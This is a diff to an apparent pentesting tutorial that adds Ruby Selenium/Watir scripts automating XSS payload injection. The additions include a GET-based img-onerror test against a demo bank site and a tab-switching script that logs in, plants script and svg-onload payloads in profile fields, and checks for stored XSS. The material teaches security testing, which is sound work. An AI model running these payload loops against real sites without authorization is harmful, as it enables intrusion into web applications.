@@ -17,7 +17,7 @@ gem install selenium-webdriver
 ### GET Request 
 ```ruby
 #!/usr/bin/env ruby
-#
+# KING SABRI | @KINGSABRI
 #
 require "selenium-webdriver"
 
@@ -53,7 +53,7 @@ element.submit                                      # Submit the text you've jus
 ### POST Request 
 ```ruby
 #!/usr/bin/env ruby
-#
+# KING SABRI | @KINGSABRI
 #
 require 'selenium-webdriver'
 
@@ -91,7 +91,7 @@ Let's test the page against XSS vulnerability. First I'll list what kind of acti
 **selenium-xss.rb**
 ```ruby
 #!/usr/bin/env ruby
-#
+# KING SABRI | @KINGSABRI
 #
 require 'selenium-webdriver'
 
@@ -105,11 +105,11 @@ payloads =
     "alert(/6/.source)"
   ]
 
-browser = Selenium::WebDriver.for :firefox
-browser.manage.window.resize_to(500, 400)
+browser = Selenium::WebDriver.for :firefox                  # You can use :ff too
+browser.manage.window.resize_to(500, 400)                   # Set browser size
 browser.get "http://www.altoromutual.com/search.aspx?"
 
-wait = Selenium::WebDriver::Wait.new(:timeout => 20)
+wait = Selenium::WebDriver::Wait.new(:timeout => 10)        # Timeout to wait 
 
 payloads.each do |payload|
   input = wait.until do
@@ -163,7 +163,7 @@ gem install watir-webdriver
 
 ```ruby
 #!/usr/bin/env ruby
-#
+# KING SABRI | @KINGSABRI
 #
 require 'watir-webdriver'
 
@@ -177,11 +177,36 @@ btn.click
 # browser.close
 ```
 
+Sometime you'll need to send XSS GET request from URL like `http://app/search?q=<script>alert</script>`. You'll face a known error `Selenium::WebDriver::Error::UnhandledAlertError: Unexpected modal dialog` if the alert box popped up but it you do refresh page for the sent payload it'll work so the fix for this issue is the following.
+
+```ruby
+#!/usr/bin/env ruby
+# KING SABRI | @KINGSABRI
+#
+require 'watir-webdriver'
+
+browser = Watir::Browser.new :firefox
+wait = Selenium::WebDriver::Wait.new(:timeout => 15)
+
+begin 
+    browser.goto("http://www.altoromutual.com/search.aspx?txtSearch=<img src=x onerror=alert(1)>")
+rescue Selenium::WebDriver::Error::UnhandledAlertError
+    browser.refresh
+    wait.until {browser.alert.exists?}
+end
+
+if browser.alert.exists? 
+  browser.alert.ok
+  puts "[+] Exploit found!"
+  browser.close
+end
+```
+
 ### POST Request 
 
 ```ruby
 #!/usr/bin/env ruby
-#
+# KING SABRI | @KINGSABRI
 #
 require 'watir-webdriver'
 
@@ -244,13 +269,13 @@ field1=""&field2=""&field3=""&field4=""
 **exploit.rb**
 ```ruby
 #!/usr/bin/env ruby
-#
+# KING SABRI | @KINGSABRI
 #
 require 'watir-webdriver'
 
 @browser = Watir::Browser.new :firefox
-@browser.window.resize_to(800, 600)
-@browser.window.move_to(400, 300)
+@browser.window.resize_to(800, 600)     # Set browser size
+@browser.window.move_to(400, 300)       # Alocate browser possition 
 
 def sendpost(payload)
   @browser.goto "file:///home/KING/Code/example.html"
@@ -283,6 +308,100 @@ payloads.each do |payload|
   end 
 end
 ```
+
+### Dealing with tabs
+One of scenarios I've faced is to exploit XSS a user profile fields and check the result in another page which present the public user's profile. Instead of revisiting the urls again and again I open new tab and refresh the public user's profile page then return back to send the exploit and so on.
+
+**xss_tab.rb**
+```ruby
+#!/usr/bin/env ruby
+# KING SABRI | @KINGSABRI
+#
+require 'watir-webdriver'
+require 'uri'
+
+@url = URI.parse "http://example.com/Users/User_Edit.aspx?userid=68"
+
+@browser = Watir::Browser.new :firefox
+@browser.window.resize_to(800, 600)
+# @browser.window.move_to(540, 165)
+@wait = Selenium::WebDriver::Wait.new(:timeout => 10)
+
+@browser.goto "http://example.com/logon.aspx"
+
+# Login 
+@browser.text_field(name: 'Login1$UserName').set("admin")
+@browser.text_field(name: 'Login1$Password').set("P@ssword")
+sleep 0.5
+@browser.button(name: 'Login1$LoginButton').click 
+
+def sendpost(payload)
+  begin 
+
+    @browser.switch                                                             # Make sure to focus on current tab/window
+    @browser.goto "#{@url.scheme}://#{@url.host}/#{@url.path}?#{@url.query}"    # Goto the URL
+    @wait.until {@browser.text_field(id: 'txtFullName').exists?}                # Wait until wanted text area appear 
+    @browser.text_field(id: 'txtFullName').set(payload)                         # Set payload to the text area
+    @browser.text_field(id: 'txtFirstName').set(payload)                        # Set payload to the text area
+    @browser.button(name: '$actionsElem$save').click                            # Click Save button 
+    
+  rescue Selenium::WebDriver::Error::UnhandledAlertError
+    @browser.refresh                            # Refresh the current page
+    @wait.until {@browser.alert.exists?}        # Check if alert box appear
+  end
+end
+
+payloads = 
+  [ 
+    "\"><video src=x onerror=alert(1);>",
+    "<img src=x onerror='alert(2)'>",
+    "<script>alert(3)</script>",
+    "<svg/OnlOad=prompt(4)>",
+    "javascript:alert(5)",
+    "alert(/6/.source)"
+  ]
+
+puts "[*] Exploitation start"
+puts "[*] Number of payloads: #{payloads.size} payloads" 
+
+@browser.send_keys(:control, 't')                               # Sent ctrl+T to open new tab
+@browser.goto "http://example.com/pub_prof/user/silver.aspx"    # Goto the use's public profile
+@browser.switch                                                 # Make sure to focus on current tab/window
+
+payloads.each do |payload|
+  
+  @browser.send_keys(:alt, '1')                                     # Send Alt+1 to go to first tab
+  sendpost payload
+  puts "[*] Sending to '#{@browser.title}' Payload : #{payload}"
+  @browser.send_keys(:alt, '2')                                     # Send Alt+2 to go to second tab
+  @browser.switch 
+  @browser.refresh
+  puts "[*] Checking Payload Resutl on #{@browser.title}"
+  
+  if @browser.alert.exists? 
+    @browser.alert.ok
+    puts 
+    puts "[+] Exploit found!: " + payload
+    @browser.close
+    exit 0
+  end
+  
+end 
+
+@browser.close
+puts
+
+```
+
+
+
+
+
+
+
+
+
+
 
 
 
